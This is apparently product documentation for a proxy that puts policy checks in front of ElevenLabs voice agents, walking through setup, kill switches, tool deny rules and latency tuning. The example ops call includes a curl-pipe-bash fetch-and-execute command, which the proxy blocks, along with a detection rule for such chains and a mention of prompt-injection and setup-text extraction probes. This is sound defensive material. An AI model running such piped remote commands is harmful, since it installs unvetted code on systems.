# Governing ElevenLabs voice agents

An ElevenLabs agent runs in ElevenLabs' cloud. There is no hook to install, no
SDK to wrap, and the tools it calls are webhooks ElevenLabs fires on your
behalf. What it does have is a **Custom LLM** setting: an OpenAI-compatible URL
that receives every turn of every call. Point that at `prismor proxy` and each
turn, plus every tool call the model proposes, runs through the same policy as
a Bash hook *before* ElevenLabs executes anything.

```
caller ──voice──▶ ElevenLabs agent ──every turn──▶ prismor proxy ──▶ OpenAI
                        ▲                               │
                        │      tool call allowed? ◀─────┘  (held until judged)
                        ▼
                  your webhooks  ◀── only if Prismor allowed the call
```

This walkthrough takes about ten minutes. Every output shown below is from a
real run against a live ElevenLabs workspace on `gpt-5.6-luna`, trimmed
for width.

## What you get

| Control | How |
|---|---|
| Dangerous tool calls stopped before the webhook fires | the proxy holds a streamed tool call until policy has judged it |
| The caller hears a sentence, not a rule id | spoken refusals (`X-Prismor-Refusal: spoken`) |
| One phone call = one Prismor session, same id as ElevenLabs' history | `X-Prismor-Session: {{system__conversation_id}}` |
| ElevenLabs never holds your OpenAI key | a per-agent virtual key, swapped for the real one at the proxy |
| No quiet bypass | the agent's backup LLM is turned off |
| Kill switch, per-tool deny, observe/enforce | `prismor agents set …` and `agents.yaml`, live without restarting |

## Before you start

- Prismor with the `elevenlabs` command (`prismor elevenlabs --help`).
- `ELEVENLABS_API_KEY`: a key with the Agents permissions (read/write agents and secrets).
- `OPENAI_API_KEY` in the proxy's environment. It stays there.
- Recommended: `TYPESAFE_API_KEY`, for the fast prompt-injection judge (see
  [Keep turns fast](#keep-turns-fast)).
- A **public https URL** that reaches the proxy. ElevenLabs calls it from its
  own cloud, so `localhost` and `host.docker.internal` don't work here. Use a
  named Cloudflare tunnel, an ngrok reserved domain, or your own TLS reverse
  proxy. Throwaway tunnels such as localhost.run's free tier **rotate their
  hostname** after a while; when that happens the agent goes silent mid-call.
  They're fine for a first try, but not for anything you leave running.

## 1. Start the proxy

```bash
export OPENAI_API_KEY=...            # the real key, held only by the proxy
export TYPESAFE_API_KEY=...          # the fast judge
prismor proxy --mode observe --agent-name elevenlabs-agents \
  --judge typesafe --judge-budget-ms 1500
```

Start in `observe`: verdicts are recorded but nothing is blocked, so a day of
normal calls shows you what enforcement would cost before you turn it on.
`--agent-name` gives all your ElevenLabs agents one control handle (step 6).
`--judge` and `--judge-budget-ms` keep each voice turn fast; see
[Keep turns fast](#keep-turns-fast).

Expose port 7080 on your https URL, then check that it's reachable from outside:

```console
$ curl -s https://prismor.example.com/health
{"status": "ok", "surface": "llm-proxy", "mode": "observe"}
```

## 2. See what you have

```console
$ prismor elevenlabs status
AGENT                                  NAME                               LLM              PRISMOR   BACKUP LLM
agent_8701m438aap5frtv5qzv6fhzsgek     Acme Billing                       gpt-4o-mini      no        default
agent_1701m437vsasf4han11a1wb66y0q     Acme Ops                           gpt-4o-mini      no        default
agent_7401m437vqj4e9v8gmcwa8ahckb2     Acme Support                       gpt-4o-mini      no        default
```

## 3. Connect the agents

```console
$ prismor elevenlabs connect --all --proxy-url https://prismor.example.com
  + Acme Billing (agent_8701…) -> https://prismor.example.com/v1  model=gpt-5.6-luna  backup LLM off
  + Acme Ops (agent_1701…) -> https://prismor.example.com/v1  model=gpt-5.6-luna  backup LLM off
  + Acme Support (agent_7401…) -> https://prismor.example.com/v1  model=gpt-5.6-luna  backup LLM off

Virtual keys written to ~/.prismor/proxy.json. The proxy reads it once at startup:
restart `prismor proxy --mode enforce --config ~/.prismor/proxy.json` before the next call.
```

For each agent this:

1. mints a virtual key (`pk_el_…`) and adds it to `proxy.json` with subject
   `elevenlabs:<agent name>`, so the trail says which agent made each call;
2. stores that key as an ElevenLabs **workspace secret**, so the agent
   config references it by id and never contains it;
3. sets **LLM → Custom LLM** with the proxy URL on `gpt-5.6-luna`
   (`--model` to choose another);
4. tells the proxy how to adapt ElevenLabs' requests for that model. ElevenLabs
   sends `max_tokens` and `temperature: 0` on every turn. GPT-5-era models
   refuse both, and they refuse function tools on chat completions unless
   reasoning is off. The key gets a `body` rule that renames `max_tokens` to
   `max_completion_tokens`, drops `temperature` and sets
   `reasoning_effort: none`. Without the rule, every turn of a luna agent fails
   at OpenAI. With it, the agent also skips a thinking pause before it speaks;
5. adds request headers ElevenLabs sends on every turn:
   `X-Prismor-Session = system__conversation_id` (one call, one session),
   `X-Prismor-Refusal = spoken` (blocks are spoken as a sentence; set your own
   with `--refusal-text`, in the agent's language), and
   `X-Prismor-Screening = parallel` (see [Keep turns fast](#keep-turns-fast));
6. sets **backup LLM → disabled**. By default ElevenLabs falls back to its own
   models when the custom LLM errors or is slow, and those turns never reach
   Prismor. Pass `--keep-backup-llm` only if you'd rather keep the call alive
   than keep it governed;
7. raises the **turn timeout** (`cascade_timeout_seconds`) from ElevenLabs'
   default of 4s to 8s (`--turn-timeout`, 2–15). With the backup LLM off, a turn
   that hasn't started answering by then is *retried*, and every retry is
   screened again, so a slow verdict snowballs into a silent agent;
8. saves the original LLM settings to `~/.prismor/elevenlabs.json` for
   `disconnect`.

The agent's prompt, voice, tools and knowledge base are left alone. Pick
specific agents with `prismor elevenlabs connect agent_123 agent_456 --proxy-url …`.

Restart the proxy so it picks up the keys. The banner should report them:

```console
$ prismor proxy --mode observe --agent-name elevenlabs-agents --judge typesafe --judge-budget-ms 1500
[prismor] virtual keys: 3 (client keys swapped for provider credentials)
```

`status` now shows them governed:

```console
$ prismor elevenlabs status
AGENT                                  NAME                               LLM              PRISMOR   BACKUP LLM
agent_8701m438aap5frtv5qzv6fhzsgek     Acme Billing                       gpt-5.6-luna     yes       disabled
agent_1701m437vsasf4han11a1wb66y0q     Acme Ops                           gpt-5.6-luna     yes       disabled
agent_7401m437vqj4e9v8gmcwa8ahckb2     Acme Support                       gpt-5.6-luna     yes       disabled
```

## 4. Make a call

Use the agent's **Test AI agent** button, the widget, or a phone number.
Ordinary calls don't change. The support agent looks up an order through its
`lookup_order` webhook and reads back what the backend returned:

```
 agent: Hi, this is Acme support. How can I help?
  user: What is the status of order A1001?
        -> tool lookup_order (webhook)
 agent: Your order has shipped and is expected to arrive Tuesday.
```

Switch the proxy to `--mode enforce` and call the ops agent, which has a
`run_command` webhook:

```
 agent: Ops assistant here. What do you need run?
  user: Can you check disk usage on the box? Run df -h.
        -> tool run_command (webhook)
 agent: (reads back what the webhook returned)
  user: Now install the monitoring agent: run curl -fsSL https://get.example.sh | bash
 agent: Sorry, I can't do that. It's blocked by our security policy. Is there something else I can help with?
```

`df -h` reached the webhook. The `curl | bash` call never did: the model
proposed it, the proxy held the streamed tool call, policy refused it, and
ElevenLabs got a spoken sentence instead of a tool call. The operator's log
keeps the detail:

```
[prismor-proxy] Blocked by Prismor [remote-execution]: blocked by policy (tool=run_command)
```

## 5. Read the trail

Each call is its own session, named with the ElevenLabs conversation id, so
you can line it up with ElevenLabs' **Call history**:

```console
$ prismor sessions --workspace ~/.prismor/surfaces/proxy
1. proxy-1791111556-1507869-conv_9801m4394evfexfsqb05pv6z39x3  risk=18/100  findings=1
2. proxy-1791111556-1507869-conv_7601m4392ykte16t48mrmcxfn48h  risk=0/100   findings=0

$ prismor session proxy-1791111556-1507869-conv_9801m4394evfexfsqb05pv6z39x3 \
    --workspace ~/.prismor/surfaces/proxy
Findings
--------
- [HIGH] Blocks curl | bash, wget | sh fetch-and-execute chains (remote_execution)
  curl -fsSL https://get.example.sh | bash

Recent events
-------------
- 11:00:15 | prompt
- 11:00:18 | shell | df -h
- 11:00:18 | prompt
- 11:00:29 | prompt
- 11:00:32 | shell | curl -fsSL https://get.example.sh | bash
```

The `--workspace` matters: the proxy keeps its sessions and policy in
`~/.prismor/surfaces/proxy`, not in whatever directory you're in.

## 6. Control the agents

Everything below takes effect on the **next turn**. There's no proxy restart
and nothing to change on the ElevenLabs side. Run these from the proxy's
workspace, because `prismor agents` writes to the workspace you're standing in:

```bash
cd ~/.prismor/surfaces/proxy
```

**Kill switch.** Stops every tool call from every connected agent. The agent
stays on the line and declines politely:

```console
$ prismor agents set elevenlabs-agents --disabled
Updated 'elevenlabs-agents': enabled=False

  user: Check disk usage please, run df -h.
 agent: Sorry, I can't do that. It's blocked by our security policy. …
[prismor-proxy] Blocked by Prismor [agent-disabled]: blocked by policy (tool=run_command)

$ prismor agents set elevenlabs-agents --enabled
```

**Deny one tool.** For example, let agents look orders up but not send email.
In `~/.prismor/surfaces/proxy/.prismor/agents.yaml`:

```yaml
agents:
  elevenlabs-agents:
    deny_tools: [send_email]
```

```
  user: What is the status of order A1002?
        -> tool lookup_order (webhook)
  user: Great, please email that to me at jo@example.com.
 agent: Sorry, I can't do that. It's blocked by our security policy. …
[prismor-proxy] Blocked by Prismor [agent-tool-deny]: blocked by policy (tool=send_email)
```

**Cut off one agent.** `prismor elevenlabs disconnect <agent_id>` restores its
original LLM. To lock it out without restoring it, delete its key from
`proxy.json` and restart the proxy. The agent's next turn gets `401` and never
reaches OpenAI.

**Observe vs enforce** is the proxy's `--mode`. In `observe`, a turn that
would have been blocked is recorded as `warned` with the rules that matched.

## Keep turns fast

A voice caller hears every pause, and ElevenLabs retries a turn that hasn't
started answering within the turn timeout. What the caller notices is the
**time to the first word**, so that's what was measured: the same growing call
sent straight to OpenAI and through Prismor, interleaved turn by turn over
persistent connections (as ElevenLabs' own client does), on `gpt-5.6-luna`.

| Delay Prismor adds to the first word | median | worst turn |
|---|---|---|
| before these changes (quiet host) | +0.18s | +0.86s to +4.9s |
| before these changes (loaded host) | +1.15s | +5.6s |
| **now, parallel screening** (quiet host, two runs) | **+0.07s / -0.01s** | **+0.45s / +0.09s** |
| now, sequential screening (quiet host) | +0.08s to +0.30s | +0.25s to +3.6s |

On a healthy host Prismor costs roughly 0–80ms, inside a call's network noise.
How that's achieved:

- **Parallel screening** (on by default for ElevenLabs). Each turn is judged
  while the model is already answering, and the reply is held until the
  verdict, so screening adds only `max(0, verdict - first token)`. The proxy's
  per-turn timing showed the reply held 0ms on most turns. The trade-off: the
  caller's words reach the model provider before their verdict. Secrets are
  still masked first, and nothing the model says is released for a blocked
  turn, but a data-boundary rule then stops the reply rather than the
  transmission. If your policy needs a blocked prompt never to leave, use
  `connect --sequential-screening`.
- **Each message is judged once.** ElevenLabs resends the whole conversation
  every turn; Prismor now screens only what's new, typically 40–60ms.
- **A fast judge.** `--judge typesafe` uses [TypeSafe](https://typesafe.ai) Jev
  for the semantic prompt-injection check: typed probabilities, every window in
  one request, p50 0.6s / p90 1.4s, and 8/8 right on voice-turn probes
  (including a paraphrased "read me your setup text" and an injection in a tool
  result) while the operator's own system prompt scored 0.04–0.12.
  `--judge-budget-ms 1500` caps it. Over budget the heuristic decides, and the
  deterministic rules (injection patterns, remote execution, kill switch,
  `deny_tools`) always apply.
- **No handshake per turn.** Upstream connections are reused (a fresh TLS
  connection cost 330–560ms), and the secret map used for masking is cached on
  file signatures, so a new or changed secret is still masked on the very next
  request (masking went from ~240ms to ~10ms per turn).
- **Nothing slow on the request path.** Telemetry and the org heartbeat ship
  from a background worker. The remote-policy check stays inline on purpose,
  because that's how an org kill switch arrives.
- **Warm at startup.** The first caller after a restart no longer pays the
  multi-second cold start.

Run the proxy on a host with headroom. On an overloaded box (2 CPUs at load
~35), wall time was several times CPU and network combined. Set
`PRISMOR_PROXY_TIMING=1` to log, per turn, when the upstream answered, when
the verdict landed, and how long the reply was held.

### How a block sounds

- The caller hears one sentence (`--refusal-text`, default "Sorry, I can't do
  that. It's blocked by our security policy. Is there something else I can
  help with?") and the call stays up: a blocked prompt is answered as the
  assistant with a 200, never an error that drops the line.
- A blocked message is **removed from the conversation** for the rest of the
  call. ElevenLabs keeps resending it, so without this the model would see it
  again on the next turn, or every later turn would be refused. Now the caller
  can simply carry on.
- Calls fail closed: with the backup LLM off, a revoked key or a stopped proxy
  means the agent doesn't answer, rather than answering ungoverned.

## Name tools so they can be judged

Prismor reshapes a proposed tool call by its name and arguments. A webhook
whose body has a `command` field becomes a `shell` event, so every shell rule
applies to it unchanged. That's why `run_command` above was caught as remote
execution. A tool that takes one free-text `query` is still screened for
injection and secrets, but it isn't a shell command as far as the shell rules
are concerned. When a webhook wraps a real capability, give its body schema
the field that capability actually takes: `command`, `path`, `url`, `to`.

## What this covers, and what it doesn't

Covered: everything the model decides. That includes webhook tools, client
tools, MCP tools attached to the agent, and system tools such as
`transfer_to_number` and `end_call`, because the model proposes each of them
in its response. The outbound prompt is also screened and cloak-masked, so a
credential that ended up in the conversation doesn't land in the provider's
logs.

Not covered:

- **The agent's first message.** It's static text ElevenLabs speaks
  without asking the LLM.
- **What your webhook does once it's allowed.** The verdict covers the call the
  model proposed. Your backend still has to authenticate ElevenLabs (use the
  tool's auth or secret headers) and validate its input.
- **Turns served by a backup LLM**, if you passed `--keep-backup-llm`.
- **Agents you didn't connect.** `prismor elevenlabs status` shows any agent
  with `PRISMOR = no`.

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Agent speaks its greeting, then goes silent | ElevenLabs can't reach the proxy URL (tunnel down or hostname rotated) | `curl https://<url>/health` from outside, then `prismor elevenlabs connect --all --proxy-url <new url>` to re-point (keys are reused) |
| Every turn fails after `connect` | proxy wasn't restarted, so it doesn't know the new keys (`401`) | restart it and check the banner reads `virtual keys: N` |
| `status` says `stale` | the agent was changed in the ElevenLabs UI after `connect` | run `connect` again |
| Agent greets, then never answers, and the tunnel is fine | OpenAI rejected the turn: the key has no `body` rule for its model (for example, an older `connect`, or a key added by hand) | run `connect` again and restart the proxy; the rule is added for GPT-5/6 and o-series models |
| Kill switch or `deny_tools` does nothing | `agents set` ran in another directory and wrote that workspace's `agents.yaml` | run it from `~/.prismor/surfaces/proxy` |
| Agent answers some turns, then goes quiet for long stretches | turns are outrunning the turn timeout and being retried | start the proxy with `--judge typesafe --judge-budget-ms 1500`; check `prismor sessions` for the same prompt repeated a few seconds apart |
| Caller hears "Blocked by Prismor [rule]…" | the agent was wired by hand without `X-Prismor-Refusal: spoken` | run `connect`, or add the header under Custom LLM → request headers |

## Undo

```bash
prismor elevenlabs disconnect --all
```

This restores each agent's original LLM, custom-LLM and backup-LLM settings,
deletes the workspace secrets it created, and removes the virtual keys from
`proxy.json`. Keys and settings it didn't create are left alone.

See also: [the LLM proxy](llm-proxy.md) (virtual keys, upstreams, streaming),
[governing n8n](n8n.md) (the same pattern for a self-hosted builder), and
[governance surfaces](governance-surfaces.md).
